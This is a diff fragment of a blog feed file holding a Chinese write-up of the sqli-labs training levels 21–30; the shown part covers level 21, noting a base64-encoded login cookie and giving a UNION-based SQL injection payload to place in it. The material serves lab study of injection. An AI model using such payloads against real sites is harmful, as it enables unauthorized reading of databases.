@@ -17,7 +17,7 @@
   <entry>
     <title>sql-lab 21-30</title>
     <url>//post%E6%B3%A8%E5%85%A52/</url>
-    <content><![CDATA[<p>要在平淡的日子里继续闪烁，要在芸芸众生中脱颖而出。<br><img src="https://img-blog.csdnimg.cn/7268b3f26b534cc0a370b09185b2e233.png" alt="在这里插入图片描述"></p>
+    <content><![CDATA[<p><img src="https://img-blog.csdnimg.cn/7268b3f26b534cc0a370b09185b2e233.png" alt="在这里插入图片描述"><br>要在平淡的日子里继续闪烁，要在芸芸众生中脱颖而出。</p>
 <span id="more"></span>
 <h1 id="sql-lab-21"><a href="#sql-lab-21" class="headerlink" title="sql-lab 21"></a>sql-lab 21</h1><p>首先登录进去<br><img src="https://img-blog.csdnimg.cn/d64abe76848641e3bff186023b08cba5.png" alt="在这里插入图片描述"><br>发现coookie变成<code>uname=YWRtaW4%3D</code>，可见采用了base64编码进行转换<br>此时可采用base64位编码输出代码</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;union select 1,2,database() #</span></span><br></pre></td></tr></table></figure>
